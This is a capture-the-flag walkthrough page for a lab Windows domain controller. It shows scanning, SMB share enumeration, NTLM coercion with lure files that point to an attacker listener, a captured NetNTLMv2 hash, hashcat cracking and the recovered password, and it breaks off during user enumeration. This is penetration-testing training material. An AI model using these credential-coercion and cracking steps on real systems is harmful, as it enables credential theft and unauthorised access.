+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rapids-credential-spraying" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Rapids Credential Spraying
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bloodhound-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        BloodHound Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="BloodHound Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#install-bloodhound-ce" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Install Bloodhound-CE
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rusthound-ce" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RustHound-CE
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#runoff-bloodhound-ce-analyzer" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Runoff (BloodHound-CE Analyzer)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Runoff (BloodHound-CE Analyzer)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#abusing-genricall-acl" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Abusing GenricAll ACL
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-ligolo-for-better-pivoting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Using ligolo for better pivoting
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Using ligolo for better pivoting">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#check-mysql-privs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Check MySQL Privs
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#god-potato-to-privesc-from-mysql" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        God Potato to PrivEsc from MySQL
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#create-new-user" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Create New User
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h2 id="machine-walkthrough">Machine Walkthrough</h2>
+<h1 id="hacksmarter-sharethepain-machine_walkthrough-rooted">HackSmarter&nbsp;#ShareThePain&nbsp;#Machine_Walkthrough&nbsp;#Rooted</h1>
+<hr>
+<p><br></p>
+<h1 id="sharethepain-machine-walkthrough">ShareThePain Machine Walkthrough</h1>
+<h2 id="create-working-directory">Create Working Directory</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>mkdir<span class="w"> </span>~/Labs/HackSmarter/ShareThePain
+</code></pre></div>
+<h2 id="initial-enumeration">Initial Enumeration</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>rustscan<span class="w"> </span>-a<span class="w"> </span><span class="m">10</span>.0.19.80<span class="w"> </span><span class="p">|</span><span class="w"> </span>deluge<span class="w"> </span>-A<span class="w"> </span>--threads<span class="w"> </span><span class="m">10</span><span class="w"> </span>--export-format<span class="w"> </span>txt
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>Deluge<span class="w"> </span>Scan<span class="w"> </span><span class="nv">Summary</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="o">==================================================</span>
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>Nmap<span class="w"> </span>Version:<span class="w"> </span>Interactive
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>Arguments:<span class="w">    </span>-A
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>Start<span class="w"> </span>Time:<span class="w">   </span><span class="m">2026</span>-04-19<span class="w"> </span><span class="m">15</span>:27:23
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>Elapsed:<span class="w">      </span>N/A<span class="w"> </span>seconds
+<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>Hosts<span class="w"> </span>Found:<span class="w">  </span><span class="m">1</span>
+<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>
+<a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>Host:<span class="w"> </span><span class="m">10</span>.0.19.80
+<a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>Status:<span class="w"> </span>up
+<a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>OS:<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2022</span>
+<a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a>PORT<span class="w">      </span>STATE<span class="w">  </span>SERVICE<span class="w">  </span>VERSION
+<a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a><span class="m">593</span>/tcp<span class="w">   </span>open<span class="w">   </span>ncacn_http<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC<span class="w"> </span>over<span class="w"> </span>HTTP<span class="w"> </span><span class="m">1</span>.0
+<a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a><span class="m">636</span>/tcp<span class="w">   </span>open<span class="w">   </span>tcpwrapped<span class="w"> </span>
+<a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a><span class="m">3269</span>/tcp<span class="w">  </span>open<span class="w">   </span>tcpwrapped<span class="w"> </span>
+<a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a><span class="m">88</span>/tcp<span class="w">    </span>open<span class="w">   </span>kerberos-sec<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Kerberos
+<a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a><span class="m">135</span>/tcp<span class="w">   </span>open<span class="w">   </span>msrpc<span class="w">    </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a><span class="m">389</span>/tcp<span class="w">   </span>open<span class="w">   </span>ldap<span class="w">     </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP
+<a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a><span class="m">464</span>/tcp<span class="w">   </span>open<span class="w">   </span>kpasswd5<span class="w"> </span>
+<a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a><span class="m">53</span>/tcp<span class="w">    </span>open<span class="w">   </span>domain<span class="w">   </span>Simple<span class="w"> </span>DNS<span class="w"> </span>Plus
+<a id="__codelineno-2-21" name="__codelineno-2-21" href="#__codelineno-2-21"></a><span class="m">445</span>/tcp<span class="w">   </span>open<span class="w">   </span>microsoft-ds<span class="w"> </span>
+<a id="__codelineno-2-22" name="__codelineno-2-22" href="#__codelineno-2-22"></a><span class="m">139</span>/tcp<span class="w">   </span>open<span class="w">   </span>netbios-ssn<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>netbios-ssn
+<a id="__codelineno-2-23" name="__codelineno-2-23" href="#__codelineno-2-23"></a><span class="m">5985</span>/tcp<span class="w">  </span>open<span class="w">   </span>http<span class="w">     </span>Microsoft<span class="w"> </span>HTTPAPI<span class="w"> </span>httpd<span class="w"> </span><span class="m">2</span>.0
+<a id="__codelineno-2-24" name="__codelineno-2-24" href="#__codelineno-2-24"></a><span class="p">|</span>_<span class="w"> </span>http-title:<span class="w"> </span>Not<span class="w"> </span>Found
+<a id="__codelineno-2-25" name="__codelineno-2-25" href="#__codelineno-2-25"></a><span class="p">|</span>_<span class="w"> </span>http-server-header:<span class="w"> </span>Microsoft-HTTPAPI/2.0
+<a id="__codelineno-2-26" name="__codelineno-2-26" href="#__codelineno-2-26"></a><span class="m">3268</span>/tcp<span class="w">  </span>open<span class="w">   </span>ldap<span class="w">     </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP
+<a id="__codelineno-2-27" name="__codelineno-2-27" href="#__codelineno-2-27"></a><span class="m">3389</span>/tcp<span class="w">  </span>open<span class="w">   </span>ms-wbt-server<span class="w"> </span>Microsoft<span class="w"> </span>Terminal<span class="w"> </span>Services
+<a id="__codelineno-2-28" name="__codelineno-2-28" href="#__codelineno-2-28"></a><span class="p">|</span>_<span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:<span class="w"> </span><span class="nv">commonName</span><span class="o">=</span>DC01.hack.smarter
+<a id="__codelineno-2-29" name="__codelineno-2-29" href="#__codelineno-2-29"></a>Not<span class="w"> </span>valid<span class="w"> </span>before:<span class="w"> </span><span class="m">2026</span>-04-15T00:55:51
+<a id="__codelineno-2-30" name="__codelineno-2-30" href="#__codelineno-2-30"></a>Not<span class="w"> </span>valid<span class="w"> </span>after:<span class="w">  </span><span class="m">2026</span>-10-15T00:55:51
+<a id="__codelineno-2-31" name="__codelineno-2-31" href="#__codelineno-2-31"></a><span class="p">|</span>_<span class="w"> </span>ssl-date:<span class="w"> </span><span class="m">2026</span>-04-19T19:27:58+00:00<span class="p">;</span><span class="w"> </span>0s<span class="w"> </span>from<span class="w"> </span>scanner<span class="w"> </span>time.
+<a id="__codelineno-2-32" name="__codelineno-2-32" href="#__codelineno-2-32"></a><span class="p">|</span>_<span class="w"> </span>rdp-ntlm-info:<span class="w"> </span>
+<a id="__codelineno-2-33" name="__codelineno-2-33" href="#__codelineno-2-33"></a><span class="w">  </span>Target_Name:<span class="w"> </span>HACK
+<a id="__codelineno-2-34" name="__codelineno-2-34" href="#__codelineno-2-34"></a><span class="w">  </span>NetBIOS_Domain_Name:<span class="w"> </span>HACK
+<a id="__codelineno-2-35" name="__codelineno-2-35" href="#__codelineno-2-35"></a><span class="w">  </span>NetBIOS_Computer_Name:<span class="w"> </span>DC01
+<a id="__codelineno-2-36" name="__codelineno-2-36" href="#__codelineno-2-36"></a><span class="w">  </span>DNS_Domain_Name:<span class="w"> </span>hack.smarter
+<a id="__codelineno-2-37" name="__codelineno-2-37" href="#__codelineno-2-37"></a><span class="w">  </span>DNS_Computer_Name:<span class="w"> </span>DC01.hack.smarter
+<a id="__codelineno-2-38" name="__codelineno-2-38" href="#__codelineno-2-38"></a><span class="w">  </span>DNS_Tree_Name:<span class="w"> </span>hack.smarter
+<a id="__codelineno-2-39" name="__codelineno-2-39" href="#__codelineno-2-39"></a><span class="w">  </span>Product_Version:<span class="w"> </span><span class="m">10</span>.0.20348
+<a id="__codelineno-2-40" name="__codelineno-2-40" href="#__codelineno-2-40"></a><span class="w">  </span>System_Time:<span class="w"> </span><span class="m">2026</span>-04-19T19:27:53+00:00
+<a id="__codelineno-2-41" name="__codelineno-2-41" href="#__codelineno-2-41"></a><span class="m">9389</span>/tcp<span class="w">  </span>open<span class="w">   </span>mc-nmf<span class="w">   </span>.NET<span class="w"> </span>Message<span class="w"> </span>Framing
+<a id="__codelineno-2-42" name="__codelineno-2-42" href="#__codelineno-2-42"></a><span class="m">47001</span>/tcp<span class="w"> </span>open<span class="w">   </span>http<span class="w">     </span>Microsoft<span class="w"> </span>HTTPAPI<span class="w"> </span>httpd<span class="w"> </span><span class="m">2</span>.0
+<a id="__codelineno-2-43" name="__codelineno-2-43" href="#__codelineno-2-43"></a><span class="p">|</span>_<span class="w"> </span>http-title:<span class="w"> </span>Not<span class="w"> </span>Found
+<a id="__codelineno-2-44" name="__codelineno-2-44" href="#__codelineno-2-44"></a><span class="p">|</span>_<span class="w"> </span>http-server-header:<span class="w"> </span>Microsoft-HTTPAPI/2.0
+<a id="__codelineno-2-45" name="__codelineno-2-45" href="#__codelineno-2-45"></a><span class="m">49675</span>/tcp<span class="w"> </span>open<span class="w">   </span>ncacn_http<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC<span class="w"> </span>over<span class="w"> </span>HTTP<span class="w"> </span><span class="m">1</span>.0
+<a id="__codelineno-2-46" name="__codelineno-2-46" href="#__codelineno-2-46"></a><span class="m">49671</span>/tcp<span class="w"> </span>open<span class="w">   </span>msrpc<span class="w">    </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<a id="__codelineno-2-47" name="__codelineno-2-47" href="#__codelineno-2-47"></a><span class="m">49664</span>/tcp<span class="w"> </span>open<span class="w">   </span>msrpc<span class="w">    </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<a id="__codelineno-2-48" name="__codelineno-2-48" href="#__codelineno-2-48"></a><span class="m">49665</span>/tcp<span class="w"> </span>open<span class="w">   </span>msrpc<span class="w">    </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<a id="__codelineno-2-49" name="__codelineno-2-49" href="#__codelineno-2-49"></a><span class="m">49672</span>/tcp<span class="w"> </span>open<span class="w">   </span>msrpc<span class="w">    </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<a id="__codelineno-2-50" name="__codelineno-2-50" href="#__codelineno-2-50"></a><span class="m">49679</span>/tcp<span class="w"> </span>open<span class="w">   </span>msrpc<span class="w">    </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<a id="__codelineno-2-51" name="__codelineno-2-51" href="#__codelineno-2-51"></a><span class="m">49667</span>/tcp<span class="w"> </span>open<span class="w">   </span>msrpc<span class="w">    </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<a id="__codelineno-2-52" name="__codelineno-2-52" href="#__codelineno-2-52"></a><span class="m">49706</span>/tcp<span class="w"> </span>open<span class="w">   </span>msrpc<span class="w">    </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<a id="__codelineno-2-53" name="__codelineno-2-53" href="#__codelineno-2-53"></a><span class="m">49717</span>/tcp<span class="w"> </span>open<span class="w">   </span>msrpc<span class="w">    </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<a id="__codelineno-2-54" name="__codelineno-2-54" href="#__codelineno-2-54"></a><span class="m">49666</span>/tcp<span class="w"> </span>open<span class="w">   </span>msrpc<span class="w">    </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<a id="__codelineno-2-55" name="__codelineno-2-55" href="#__codelineno-2-55"></a><span class="m">49676</span>/tcp<span class="w"> </span>open<span class="w">   </span>msrpc<span class="w">    </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<a id="__codelineno-2-56" name="__codelineno-2-56" href="#__codelineno-2-56"></a><span class="m">49827</span>/tcp<span class="w"> </span>open<span class="w">   </span>msrpc<span class="w">    </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+</code></pre></div>
+<blockquote>
+<p>[!warning] This is a Windows Machine so we need to add information to the /etc/hosts</p>
+<ul>
+<li>10.0.19.80 DC01.hack.smarter</li>
+</ul>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>tail<span class="w"> </span>/etc/hosts
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="m">10</span>.0.19.80<span class="w">      </span>DC01.hack.smarter
+</code></pre></div>
+<h2 id="windows-enumeration">Windows Enumeration</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>maelstrom<span class="w"> </span><span class="m">10</span>.0.19.80<span class="w"> </span>-A<span class="w"> </span>-o<span class="w"> </span>initial_enumeration.txt
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Target<span class="w"> </span>is<span class="w"> </span>a<span class="w"> </span>Domain<span class="w"> </span>Controller
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="w">  </span>Hostname:<span class="w">        </span>DC01
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="w">  </span>FQDN:<span class="w">            </span>DC01.hack.smarter
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="w">  </span>NetBIOS<span class="w"> </span>Domain:<span class="w">  </span>HACK
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="w">  </span>DNS<span class="w"> </span>Domain:<span class="w">      </span>hack.smarter
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>
+<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Server<span class="w"> </span>allows<span class="w"> </span>authentication<span class="w"> </span>via<span class="w"> </span>username<span class="w"> </span><span class="s1">''</span><span class="w"> </span>and<span class="w"> </span>password<span class="w"> </span><span class="s1">''</span>
+<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>
+<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Found<span class="w"> </span>OS<span class="w"> </span>information<span class="w"> </span>via<span class="w"> </span>SMB
+<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a><span class="w">  </span>OS:<span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2022</span><span class="w"> </span>Build<span class="w"> </span><span class="m">20348</span><span class="w"> </span>x64
+<a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a><span class="w">  </span>OS<span class="w"> </span>version:<span class="w"> </span><span class="s1">'2022'</span>
+<a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a><span class="w">  </span>Architecture:<span class="w"> </span>x64
+<a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a><span class="w">  </span>OS<span class="w"> </span>build:<span class="w"> </span><span class="s1">'20348'</span>
+<a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a>
+<a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a>RDP<span class="w"> </span>CONFIGURATION
+<a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a>--------------------------------------------------
+<a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a><span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>RDP:<span class="w"> </span>Enabled
+<a id="__codelineno-6-18" name="__codelineno-6-18" href="#__codelineno-6-18"></a><span class="w">  </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Hostname:<span class="w"> </span>DC01
+<a id="__codelineno-6-19" name="__codelineno-6-19" href="#__codelineno-6-19"></a><span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>NLA:<span class="w"> </span>Required
+<a id="__codelineno-6-20" name="__codelineno-6-20" href="#__codelineno-6-20"></a><span class="w">      </span>Network<span class="w"> </span>Level<span class="w"> </span>Authentication<span class="w"> </span>protects<span class="w"> </span>against<span class="w"> </span>some<span class="w"> </span>attacks
+<a id="__codelineno-6-21" name="__codelineno-6-21" href="#__codelineno-6-21"></a>
+<a id="__codelineno-6-22" name="__codelineno-6-22" href="#__codelineno-6-22"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>RDP<span class="w"> </span>is<span class="w"> </span>enabled<span class="w"> </span>on<span class="w"> </span>target
+<a id="__codelineno-6-23" name="__codelineno-6-23" href="#__codelineno-6-23"></a>
+<a id="__codelineno-6-24" name="__codelineno-6-24" href="#__codelineno-6-24"></a>ACCESSIBLE<span class="w"> </span>SHARES<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="o">)</span>
+<a id="__codelineno-6-25" name="__codelineno-6-25" href="#__codelineno-6-25"></a>Share<span class="w">           </span>Access<span class="w">       </span>Comment
+<a id="__codelineno-6-26" name="__codelineno-6-26" href="#__codelineno-6-26"></a>---------------<span class="w"> </span>------------<span class="w"> </span>------------------------------
+<a id="__codelineno-6-27" name="__codelineno-6-27" href="#__codelineno-6-27"></a>Share<span class="w">           </span>READ,WRITE<span class="w">   </span>
+<a id="__codelineno-6-28" name="__codelineno-6-28" href="#__codelineno-6-28"></a>
+<a id="__codelineno-6-29" name="__codelineno-6-29" href="#__codelineno-6-29"></a>NO<span class="w"> </span>ACCESS<span class="w"> </span><span class="o">(</span><span class="m">5</span><span class="o">)</span>
+<a id="__codelineno-6-30" name="__codelineno-6-30" href="#__codelineno-6-30"></a>Share<span class="w">           </span>Comment
+<a id="__codelineno-6-31" name="__codelineno-6-31" href="#__codelineno-6-31"></a>---------------<span class="w"> </span>------------------------------
+<a id="__codelineno-6-32" name="__codelineno-6-32" href="#__codelineno-6-32"></a>ADMIN$<span class="w">          </span>Remote<span class="w"> </span>Admin
+<a id="__codelineno-6-33" name="__codelineno-6-33" href="#__codelineno-6-33"></a>C$<span class="w">              </span>Default<span class="w"> </span>share
+<a id="__codelineno-6-34" name="__codelineno-6-34" href="#__codelineno-6-34"></a>IPC$<span class="w">            </span>Remote<span class="w"> </span>IPC
+<a id="__codelineno-6-35" name="__codelineno-6-35" href="#__codelineno-6-35"></a>NETLOGON<span class="w">        </span>Logon<span class="w"> </span>server<span class="w"> </span>share
+<a id="__codelineno-6-36" name="__codelineno-6-36" href="#__codelineno-6-36"></a>SYSVOL<span class="w">          </span>Logon<span class="w"> </span>server<span class="w"> </span>share
+</code></pre></div>
+<p>Looks like all we have right now is a single writable share so lets use <a href="https://github.com/Real-Fruit-Snacks/Lure">Lure</a> to try and coerce NTLM authentication from any user that browses the share.</p>
+<h2 id="coerce-ntlm-authentication-using-lure">Coerce NTLM Authentication using Lure</h2>
+<blockquote>
+<p>[!info]</p>
+<ul>
+<li>Tool: <a href="https://github.com/Real-Fruit-Snacks/Lure">Lure</a></li>
+</ul>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>lure<span class="w"> </span>-r<span class="w"> </span><span class="m">10</span>.0.19.80<span class="w"> </span>-l<span class="w"> </span><span class="m">10</span>.200.46.199<span class="w"> </span>-d<span class="w"> </span>hack.smarter<span class="w"> </span>-i<span class="w"> </span>tun0<span class="w"> </span>-a<span class="w"> </span>share<span class="w"> </span>-A
+</code></pre></div>
+<blockquote>
+<p>[!important] We got a bite from <code>bob.ross</code></p>
+</blockquote>
+<p>We need to add this name to our username file and make a file to add the hash to.</p>
+<h3 id="got-a-bite">Got a Bite</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>bob.ross::HACK:da4fbe8964411712:0F5614756D0418789E59F5B704D8A120:010100000000000080C2C62D1AD0DC011335D51EE7443D9D0000000002000800460051005100350001001E00570049004E002D0059005A0042004100370047004A0054005A004500330004003400570049004E002D0059005A0042004100370047004A0054005A00450033002E0046005100510035002E004C004F00430041004C000300140046005100510035002E004C004F00430041004C000500140046005100510035002E004C004F00430041004C000700080080C2C62D1AD0DC0106000400020000000800300030000000000000000100000000200000594E24D693467666C4BAEA7136CA3D596D90DBFFCF327E20938C634CE84693900A001000000000000000000000000000000000000900240063006900660073002F00310030002E003200300030002E00340036002E003100390039000000000000000000
+</code></pre></div>
+<p>Now that we have this we need to crack it to get the password.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">5600</span><span class="w"> </span>hashes<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>-r<span class="w"> </span>/usr/share/hashcat/rules/best66.rule
+</code></pre></div>
+<blockquote>
+<p>[!important] Cracked <code>bob.ross</code> hash to get the password <code>137Password123!@#</code></p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>137Password123!@#
+</code></pre></div>
+<p>Now that we have a username and known password we will add these to our known_users file and do enumeration again with maelstrom.</p>
+<h2 id="windows-enumeration-for-bobross">Windows Enumeration for <code>bob.ross</code></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>maelstrom<span class="w"> </span><span class="m">10</span>.0.19.80<span class="w"> </span>-C<span class="w"> </span>known_users<span class="w"> </span>-A<span class="w"> </span>-o<span class="w"> </span>bob.ross_enumeration.txt<span class="w"> </span>--copy-paste
+</code></pre></div>
+<p>We have done this scan earlier with no users, so this time we will only put down the information that is new and that will be useful to us. This time I have added the <em>--copy-paste</em> flag so we can populate our username file if we get anything back.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Credentials<span class="w"> </span>......<span class="w"> </span><span class="m">2</span><span class="w"> </span>validated<span class="w"> </span>user<span class="o">(</span>s<span class="o">)</span>
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="w">  </span>Standard<span class="w"> </span>Users:
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="w">    </span>-<span class="w"> </span>NULL<span class="w"> </span>SESSION<span class="w"> </span><span class="o">(</span>null<span class="o">)</span>
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="w">    </span>-<span class="w"> </span>bob.ross<span class="w"> </span><span class="o">(</span>password<span class="o">)</span>
+<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>
+<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>Built-in<span class="w"> </span>Accounts<span class="w"> </span><span class="o">(</span><span class="m">3</span><span class="o">)</span>
+<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>RID<span class="w">     </span>Username<span class="w">                </span>Description
+<a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>------<span class="w">  </span>----------------------<span class="w">  </span>----------------------------------------
+<a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a><span class="m">500</span><span class="w">     </span>Administrator<span class="w">           </span>Built-in<span class="w"> </span>account<span class="w"> </span><span class="k">for</span><span class="w"> </span>administering<span class="w"> </span>th...
+<a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a><span class="m">501</span><span class="w">     </span>Guest<span class="w">                   </span>account<span class="w"> </span><span class="k">for</span><span class="w"> </span>guest<span class="w"> </span>access<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>compu...
+<a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a><span class="m">502</span><span class="w">     </span>krbtgt<span class="w">                  </span>Key<span class="w"> </span>Distribution<span class="w"> </span>Center<span class="w"> </span>Service<span class="w"> </span>Account
+<a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a>
+<a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a>Computer<span class="w"> </span>Accounts<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="o">)</span>
+<a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a>RID<span class="w">     </span>Username<span class="w">                </span>Description
+<a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a>------<span class="w">  </span>----------------------<span class="w">  </span>----------------------------------------
+<a id="__codelineno-12-16" name="__codelineno-12-16" href="#__codelineno-12-16"></a><span class="m">1000</span><span class="w">    </span>DC01$<span class="w">                   </span>
+<a id="__codelineno-12-17" name="__codelineno-12-17" href="#__codelineno-12-17"></a>
+<a id="__codelineno-12-18" name="__codelineno-12-18" href="#__codelineno-12-18"></a>Standard<span class="w"> </span>Users<span class="w"> </span><span class="o">(</span><span class="m">3</span><span class="o">)</span>
+<a id="__codelineno-12-19" name="__codelineno-12-19" href="#__codelineno-12-19"></a>RID<span class="w">     </span>Username<span class="w">                </span>Description
+<a id="__codelineno-12-20" name="__codelineno-12-20" href="#__codelineno-12-20"></a>------<span class="w">  </span>----------------------<span class="w">  </span>----------------------------------------
+<a id="__codelineno-12-21" name="__codelineno-12-21" href="#__codelineno-12-21"></a><span class="m">1103</span><span class="w">    </span>bob.ross<span class="w">                </span>
+<a id="__codelineno-12-22" name="__codelineno-12-22" href="#__codelineno-12-22"></a><span class="m">1104</span><span class="w">    </span>alice.wonderland<span class="w">        </span>
